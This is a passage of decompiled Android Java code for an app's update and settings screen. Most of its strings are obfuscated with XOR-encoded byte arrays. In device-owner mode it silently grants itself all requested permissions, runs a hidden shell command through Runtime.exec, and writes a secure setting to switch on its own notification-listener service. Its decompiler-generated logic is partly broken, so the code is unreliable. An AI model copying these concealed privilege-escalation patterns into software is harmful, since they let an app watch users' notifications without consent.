package com.example.navistart;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.widget.Button;
import android.widget.Switch;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.example.navistart.DPups;
import com.example.navistart.InstallResultReceiver;
import com.example.navistart.NLService;
import com.example.navistart.UpdateActivity;
import com.woha.appmanag.ManageAppsActivity;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import kotlin.jvm.internal.ByteCompanionObject;
import kotlin.p118io.encoding.Base64;
import p005a4.RunnableC0010c;
import p047e0.AbstractAsyncTaskC1449z2;
import p047e0.AbstractC1387m;
import p047e0.AbstractC1406p3;
import p047e0.C1378k0;
import p047e0.C1407q;
import p047e0.C1418s0;
import p047e0.C1445y2;
import p078h0.C1652b;
import p121l0.C2194a;
import p132m0.C2349s0;
import p152o0.C2571e;
import p206u0.C3277a;
import p250y5.AbstractC3656k;

/* JADX INFO: compiled from: r8-map-id-94e2637d1b30c6542972a7fc4ced35aa6da258c4e6702fc7c9cbf0ebc32bec75 */
/* JADX INFO: loaded from: classes.dex */
public class UpdateActivity extends AppCompatActivity {

    /* JADX INFO: renamed from: l */
    public static final String f1678l = AbstractC1387m.m2421h(new byte[]{-111, 19, -115, 30, -60, -125, 78, -123, -101, 28, -115, 48, -63, -87, 78, -127}, new byte[]{-14, ByteCompanionObject.MAX_VALUE, -24, ByteCompanionObject.MAX_VALUE, -74, -57, 43, -13});

    /* JADX INFO: renamed from: b */
    public TextView f1679b;

    /* JADX INFO: renamed from: c */
    public Button f1680c;

    /* JADX INFO: renamed from: d */
    public Button f1681d;

    /* JADX INFO: renamed from: e */
    public Button f1682e;

    /* JADX INFO: renamed from: f */
    public Button f1683f;

    /* JADX INFO: renamed from: g */
    public Button f1684g;

    /* JADX INFO: renamed from: h */
    public Button f1685h;

    /* JADX INFO: renamed from: i */
    public Switch f1686i;

    /* JADX INFO: renamed from: j */
    public int f1687j;

    /* JADX INFO: renamed from: k */
    public final Handler f1688k;

    public UpdateActivity() {
        AbstractC1406p3.m2447b(2);
        AbstractC1406p3.m2447b(4);
        AbstractC1406p3.m2446a(6);
        AbstractC1406p3.m2446a(0);
        AbstractC1387m.m2421h(new byte[]{90}, new byte[]{116, 0, 21, 31, -35, 44, 37, 82});
        AbstractC1406p3.m2448c(5);
        AbstractC1406p3.m2448c(7);
        this.f1687j = 0;
        this.f1688k = new Handler(Looper.getMainLooper());
    }

    @Override // androidx.appcompat.app.AppCompatActivity, android.app.Activity, android.view.ContextThemeWrapper, android.content.ContextWrapper
    public final void attachBaseContext(Context context) {
        super.attachBaseContext(AbstractC1387m.m2437x(context));
        Log.d(AbstractC1387m.m2421h(new byte[]{-10, -116, -125, 106, -40}, new byte[]{-94, -34, -62, 41, -99, 126, -82, 59}), AbstractC1387m.m2421h(new byte[]{-126, -53, -93, 121, -49, 10, 111, 58, -29, -55, -75, ByteCompanionObject.MAX_VALUE, -52, 23, 59, 55, -84, -120, -92, 100, -40, 17, 111, 121, -29}, new byte[]{-61, -88, -41, 16, -71, 99, 27, 67}).concat(getClass().getSimpleName()));
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public final void onCreate(Bundle bundle) {
        String str;
        super.onCreate(bundle);
        getWindow().setStatusBarColor(ContextCompat.getColor(this, R.color.modern_background));
        getWindow().setNavigationBarColor(ContextCompat.getColor(this, R.color.modern_background));
        final int i10 = 0;
        getWindow().getDecorView().setSystemUiVisibility(0);
        setContentView(R.layout.activity_update);
        ((Button) findViewById(R.id.button28)).setOnClickListener(new View.OnClickListener(this) { // from class: e0.v2

            /* JADX INFO: renamed from: c */
            public final /* synthetic */ UpdateActivity f3455c;

            {
                this.f3455c = this;
            }

            /* JADX WARN: Code duplicated, block: B:107:0x03a5  */
            /* JADX WARN: Code duplicated, block: B:113:0x03dc  */
            /* JADX WARN: Code duplicated, block: B:134:0x01c9 A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:136:0x01af A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:52:0x01b5  */
            /* JADX WARN: Code duplicated, block: B:57:0x01d2  */
            /* JADX WARN: Code duplicated, block: B:68:0x0263 A[DONT_INVERT] */
            /* JADX WARN: Code duplicated, block: B:69:0x0265 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            /* JADX WARN: Code duplicated, block: B:73:0x0292 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                String[] strArr;
                char c;
                Boolean bool;
                Iterator<AccessibilityServiceInfo> it;
                String string;
                ComponentName componentName;
                String strFlattenToString;
                int i11 = i10;
                final UpdateActivity updateActivity = this.f3455c;
                final int i12 = 1;
                final int i13 = 0;
                switch (i11) {
                    case 0:
                        String str2 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 1:
                        String str3 = UpdateActivity.f1678l;
                        AbstractC3656k.m5875u(updateActivity, new Intent(updateActivity, (Class<?>) ManageAppsActivity.class), null);
                        break;
                    case 2:
                        String str4 = UpdateActivity.f1678l;
                        if (!((DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-54, -62, -102, 109, 29, -104, -14, 90, -63, -53, -123, 103, 7}, new byte[]{-82, -89, -20, 4, 126, -3, -83, 42}))).isDeviceOwnerApp(updateActivity.getPackageName())) {
                            Context applicationContext = updateActivity.getApplicationContext();
                            try {
                                strArr = applicationContext.getPackageManager().getPackageInfo(applicationContext.getPackageName(), 4096).requestedPermissions;
                            } catch (PackageManager.NameNotFoundException e) {
                                e.printStackTrace();
                                strArr = new String[0];
                            }
                            if (strArr != null && strArr.length != 0) {
                                ArrayList arrayList = new ArrayList();
                                for (String str5 : strArr) {
                                    if (ContextCompat.checkSelfPermission(applicationContext, str5) != 0) {
                                        arrayList.add(str5);
                                    }
                                }
                                if (!arrayList.isEmpty()) {
                                    ActivityCompat.requestPermissions(updateActivity, (String[]) arrayList.toArray(new String[0]), 100);
                                }
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{50, -84, -96, 96, -101, 114, -102, -12, 58, -93, -86, 113, -111}, new byte[]{83, -49, -61, 5, -24, 1, -13, -106}))).getEnabledAccessibilityServiceList(-1);
                            Boolean bool2 = Boolean.FALSE;
                            Iterator<AccessibilityServiceInfo> it2 = enabledAccessibilityServiceList.iterator();
                            while (it2.hasNext()) {
                                if (it2.next().getId().equals(updateActivity.getPackageName())) {
                                    bool2 = Boolean.TRUE;
                                }
                            }
                            if (!bool2.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{-80, 10, -116, -127, 107, -34, 3, -85, -94, 1, -100, -121, 109, -39, 0, -10, -1, 37, -85, -80, 65, -28, 52, -52, -109, 45, -92, -70, 80, -18, 56, -42, -108, 48, -68, -70, 74, -16, 52}, new byte[]{-47, 100, -24, -13, 4, -73, 103, -123})), null);
                            }
                            break;
                        } else {
                            ComponentName componentName2 = new ComponentName(updateActivity, (Class<?>) DPups.class);
                            String strM2421h = AbstractC1387m.m2421h(new byte[]{-14, -107, 82, 72, 40, 29, 122, 96, -51, -98, 103, 87, 32, 0, 125, 102, -48}, new byte[]{-94, -16, 32, 37, 65, 110, 9, 9});
                            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-5, -44, -62, 93, -26, -81, 31, -75, -16, -35, -35, 87, -4}, new byte[]{-97, -79, -76, 52, -123, -54, 64, -59}));
                            try {
                                String packageName = updateActivity.getPackageName();
                                String[] strArr2 = updateActivity.getPackageManager().getPackageInfo(packageName, 4096).requestedPermissions;
                                if (strArr2 != null) {
                                    int length = strArr2.length;
                                    c = 0;
                                    while (i13 < length) {
                                        try {
                                            devicePolicyManager.setPermissionGrantState(componentName2, packageName, strArr2[i13], 1);
                                            i13++;
                                        } catch (Exception e6) {
                                            e = e6;
                                            e.printStackTrace();
                                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList2 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                                            bool = Boolean.FALSE;
                                            it = enabledAccessibilityServiceList2.iterator();
                                            while (it.hasNext()) {
                                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                                    bool = Boolean.TRUE;
                                                }
                                            }
                                            if (!bool.booleanValue()) {
                                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                                            }
                                            DevicePolicyManager devicePolicyManager2 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                                            devicePolicyManager2.isDeviceOwnerApp(updateActivity.getPackageName());
                                            Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                            string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                            componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                            if (string == null) {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            } else {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            }
                                            if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                                                ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                                                return;
                                            } else if (Build.VERSION.SDK_INT < 29) {
                                                return;
                                            } else {
                                                return;
                                            }
                                        }
                                    }
                                } else {
                                    c = 0;
                                }
                            } catch (Exception e10) {
                                e = e10;
                                c = 0;
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList3 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                            bool = Boolean.FALSE;
                            it = enabledAccessibilityServiceList3.iterator();
                            while (it.hasNext()) {
                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                    bool = Boolean.TRUE;
                                }
                            }
                            if (!bool.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                            }
                            DevicePolicyManager devicePolicyManager3 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                            devicePolicyManager3.isDeviceOwnerApp(updateActivity.getPackageName());
                            try {
                                Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                break;
                            } catch (IOException unused) {
                            }
                            try {
                                string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                if (string == null && string.contains(componentName.flattenToString())) {
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{63, -125, 40, -126, 59, -101, -86, 81, 5, -123, 51, -123, 125, -98, -96, 67, 5, -119, 50, -114, 47, -46, -88, 92, 3, -119, Base64.padSymbol, -113, 36, -46, -82, 66, 16, -126, 40, -114, 57, -36}, new byte[]{113, -20, 92, -21, 93, -14, -55, 48}));
                                } else {
                                    if (string != null || string.isEmpty()) {
                                        strFlattenToString = componentName.flattenToString();
                                    } else {
                                        StringBuilder sb = new StringBuilder();
                                        sb.append(string);
                                        byte[] bArr = new byte[1];
                                        bArr[c] = 55;
                                        sb.append(AbstractC1387m.m2421h(bArr, new byte[]{13, 42, -127, ByteCompanionObject.MIN_VALUE, -4, -26, 59, -41}));
                                        sb.append(componentName.flattenToString());
                                        strFlattenToString = sb.toString();
                                    }
                                    Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                }
                            } catch (Exception e11) {
                                Log.e(strM2421h, AbstractC1387m.m2421h(new byte[]{-47, 14, 100, 118, -81, -49, -8, 87, -8, 79, 106, 104, -85, -59, -84, 3, -7, 0, 121, 115, -84, -62, -69, 66, -29, 6, 98, 116, -22, -57, -79, 80, -29, 10, 99, ByteCompanionObject.MAX_VALUE, -72, -117, -88, 70, -27, 2, 100, 105, -71, -62, -73, 77, -83, 79}, new byte[]{-105, 111, 13, 26, -54, -85, -40, 35}) + e11.getMessage());
                            }
                        }
                        if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                        } else if (Build.VERSION.SDK_INT < 29 && ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{-98, -29, -58, 50, 77, 42, -53, 38, -113, -24, -48, 45, 75, 48, -36, 97, -112, -29, -116, 1, 97, 0, -22, 91, -84, -46, -32, 1, 97, 8, -24, 90, -80, -40, -20, 4, 125, 15, -32, 75, -66, -39, -21, 15, 108}, new byte[]{-1, -115, -94, 64, 34, 67, -81, 8})) != 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{-51, 34, -45, -116, 87, 2, 116, -126, -36, 41, -59, -109, 81, 24, 99, -59, -61, 34, -103, -65, 123, 40, 85, -1, -1, 19, -11, -65, 123, 32, 87, -2, -29, 25, -7, -70, 103, 39, 95, -17, -19, 24, -2, -79, 118}, new byte[]{-84, 76, -73, -2, 56, 107, 16, -84})}, 100);
                            break;
                        }
                        break;
                    case 3:
                        String str6 = UpdateActivity.f1678l;
                        C1652b.m2745o().loadBoolean(AbstractC1387m.m2421h(new byte[]{102, 120, 47, -40, 75}, new byte[]{34, 40, 90, -88, 56, 83, 4, 111}), false);
                        SharedPreferences.Editor editorEdit = updateActivity.getSharedPreferences(C3277a.f9610c, 0).edit();
                        editorEdit.clear();
                        editorEdit.apply();
                        SharedPreferences.Editor editorEdit2 = updateActivity.getSharedPreferences(C2571e.f7130b, 0).edit();
                        editorEdit2.clear();
                        editorEdit2.apply();
                        File[] fileArrListFiles = updateActivity.getFilesDir().listFiles();
                        if (fileArrListFiles != null) {
                            for (File file : fileArrListFiles) {
                                file.delete();
                            }
                        }
                        File[] fileArrListFiles2 = updateActivity.getCacheDir().listFiles();
                        if (fileArrListFiles2 != null) {
                            int length2 = fileArrListFiles2.length;
                            while (i13 < length2) {
                                fileArrListFiles2[i13].delete();
                                i13++;
                            }
                        }
                        break;
                    case 4:
                        updateActivity.f1685h.setEnabled(false);
                        Handler handler = new Handler(Looper.getMainLooper());
                        updateActivity.m1600s(AbstractC1387m.m2421h(new byte[]{-99, 73, 20, -43, 25, -99, 12}, new byte[]{-12, 39, 125, -95, 112, -4, 96, -126}));
                        while (i12 <= 4) {
                            handler.postDelayed(new RunnableC0010c(updateActivity, i12, 6), ((long) i12) * 2000);
                            i12++;
                        }
                        handler.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i13) {
                                    case 0:
                                        String str7 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str8 = UpdateActivity.f1678l;
                                        Log.e(str8, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str8, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str8, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str8, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str8, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str8, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str8, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str8, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 10000L);
                        break;
                    case 5:
                        String str7 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 6:
                        String str8 = UpdateActivity.f1678l;
                        C2194a.m3500t(C2349s0.class, null).show(updateActivity.getSupportFragmentManager(), AbstractC1387m.m2421h(new byte[]{88, -23, -7, 47, -63, -19, 45, 63, 107, -5, -28, 46, -48, -15, 43, 56, 64, -5, -45, 37, -53, -28, 36, 34, 83}, new byte[]{52, -120, -116, 65, -94, -123, 72, 77}));
                        break;
                    case 7:
                        String str9 = UpdateActivity.f1678l;
                        updateActivity.m1601t();
                        break;
                    case 8:
                        updateActivity.f1687j++;
                        Handler handler2 = updateActivity.f1688k;
                        handler2.removeCallbacksAndMessages(null);
                        handler2.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i12) {
                                    case 0:
                                        String str10 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str11 = UpdateActivity.f1678l;
                                        Log.e(str11, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
